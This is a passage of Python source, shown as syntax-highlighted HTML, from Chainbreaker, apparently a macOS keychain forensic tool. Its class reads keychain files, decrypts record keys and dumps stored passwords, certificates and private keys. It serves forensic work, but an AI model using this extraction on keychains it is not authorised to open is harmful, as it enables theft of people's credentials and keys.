</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This program is distributed in the hope that it will be useful, but</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># WITHOUT ANY WARRANTY; without even the implied warranty of</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># General Public License for more details.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># You should have received a copy of the GNU General Public License</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># along with this program; if not, write to the Free Software</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pbkdf2 <span style="color:#f92672">import</span> PBKDF2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> schema <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> schema <span style="color:#f92672">import</span> _APPL_DB_HEADER, _APPL_DB_SCHEMA, _TABLE_HEADER, _DB_BLOB, _GENERIC_PW_HEADER, \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    _KEY_BLOB_REC_HEADER, _KEY_BLOB, _SSGP, _INTERNET_PW_HEADER, _APPLE_SHARE_HEADER, _X509_CERT_HEADER, _SECKEY_HEADER, \
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    _UNLOCK_BLOB, _KEYCHAIN_TIME, _INT, _FOUR_CHAR_CODE, _LV, _TABLE_ID, _RECORD_OFFSET
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pyDes <span style="color:#f92672">import</span> TripleDES, CBC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> unhexlify, hexlify
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Chainbreaker</span>(object):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ATOM_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    KEYCHAIN_SIGNATURE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;kych&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    BLOCKSIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    KEYLEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    MAGIC_CMS_IV <span style="color:#f92672">=</span> unhexlify(<span style="color:#e6db74">&#39;4adda22c79e82105&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    KEYCHAIN_LOCKED_SIGNATURE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[Invalid Password / Keychain Locked]&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, filepath, unlock_password<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, unlock_key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, unlock_file<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_filepath <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_password <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_unlock_file <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_db_key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Raw buffer of keychain file contents</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>kc_buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>schema_info <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>table_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>table_metadata <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>record_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>table_count <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>table_enum <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>symmetric_key_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>symmetric_key_offset <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>dbblob <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(<span style="color:#e6db74">&#39;Chainbreaker&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>key_list <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>db_key <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>filepath <span style="color:#f92672">=</span> filepath
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>_is_valid_keychain():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;Keychain signature does not match. are you sure this is a valid keychain file?&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>unlock_password <span style="color:#f92672">=</span> unlock_password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>unlock_key <span style="color:#f92672">=</span> unlock_key
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>unlock_file <span style="color:#f92672">=</span> unlock_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of GenericPasswordRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_generic_passwords</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, generic_pw_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_GENERIC_PASSWORD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> generic_pw_id <span style="color:#f92672">in</span> generic_pw_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_get_generic_password_record(generic_pw_id))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Generic Password Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of InterertPasswordRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_internet_passwords</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, internet_pw_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_INTERNET_PASSWORD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> internet_pw_id <span style="color:#f92672">in</span> internet_pw_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_get_internet_password_record(internet_pw_id))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Internet Password Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of AppleshareRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_appleshare_passwords</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, appleshare_pw_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_APPLESHARE_PASSWORD)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> appleshare_pw_offset <span style="color:#f92672">in</span> appleshare_pw_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_get_appleshare_record(appleshare_pw_offset))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Appleshare Records Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of X509CertfificateRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_x509_certificates</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, x509_cert_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_X509_CERTIFICATE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i, x509_cert_offset <span style="color:#f92672">in</span> enumerate(x509_cert_list, <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(self<span style="color:#f92672">.</span>_get_x_509_record(x509_cert_offset))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Certificate Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of PublicKeyRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_public_keys</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_metadata, public_key_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_PUBLIC_KEY)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> public_key_offset <span style="color:#f92672">in</span> public_key_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>_get_public_key_record(public_key_offset))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Public Key Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns a list of PrivateKeyRecord objects extracted from the Keychain</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_private_keys</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            table_meta, private_key_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_PRIVATE_KEY)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i, private_key_offset <span style="color:#f92672">in</span> enumerate(private_key_list, <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                entries<span style="color:#f92672">.</span>append(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>_get_private_key_record(private_key_offset))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;[!] Private Key Table is not available&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> entries
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Attempts to read the keychain file into self.kc_buffer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># On success it extracts out relevant information (table information, key offsets, and the DB BLob)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_read_keychain_to_buffer</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>filepath, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> fp:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>kc_buffer <span style="color:#f92672">=</span> fp<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>kc_buffer:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>header <span style="color:#f92672">=</span> _APPL_DB_HEADER(self<span style="color:#f92672">.</span>kc_buffer[:_APPL_DB_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>schema_info, self<span style="color:#f92672">.</span>table_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_schema_info(self<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>SchemaOffset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>table_metadata, self<span style="color:#f92672">.</span>record_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table(self<span style="color:#f92672">.</span>table_list[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>table_count, self<span style="color:#f92672">.</span>table_enum <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_name_to_list(self<span style="color:#f92672">.</span>record_list, self<span style="color:#f92672">.</span>table_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>symmetric_key_offset <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>table_list[self<span style="color:#f92672">.</span>table_enum[CSSM_DL_DB_RECORD_METADATA]]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">=</span> _APPL_DB_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>symmetric_key_offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>dbblob <span style="color:#f92672">=</span> _DB_BLOB(self<span style="color:#f92672">.</span>kc_buffer[self<span style="color:#f92672">.</span>base_addr:self<span style="color:#f92672">.</span>base_addr <span style="color:#f92672">+</span> _DB_BLOB<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">OSError</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>logger<span style="color:#f92672">.</span>critical(<span style="color:#e6db74">&#34;Unable to read keychain: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> e)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Simple check to make sure the keychain we&#39;re looking at is valid.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># A valid keychain begins with &#34;kych&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_is_valid_keychain</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>kc_buffer[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>] <span style="color:#f92672">!=</span> Chainbreaker<span style="color:#f92672">.</span>KEYCHAIN_SIGNATURE:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># When the keychain is successfully decrypted (&#34;unlocked&#34;), we can obtain a list of encryption keys</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># used to encrypt individual records, indexed off of the SSGB label.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_generate_key_list</span>(self):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        table_meta_data, symmetric_key_list <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_table_from_type(CSSM_DL_DB_RECORD_SYMMETRIC_KEY)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> symmetric_key_record <span style="color:#f92672">in</span> symmetric_key_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            keyblob, ciphertext, iv, return_value <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_keyblob_record(symmetric_key_record)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> return_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                password <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>keyblob_decryption(ciphertext, iv, self<span style="color:#f92672">.</span>db_key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> password <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    self<span style="color:#f92672">.</span>key_list[keyblob] <span style="color:#f92672">=</span> password
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> len(self<span style="color:#f92672">.</span>key_list)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Returns basic schema (table count, size) and a list of the tables from the Keychain file.</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_schema_info</span>(self, offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        table_list <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
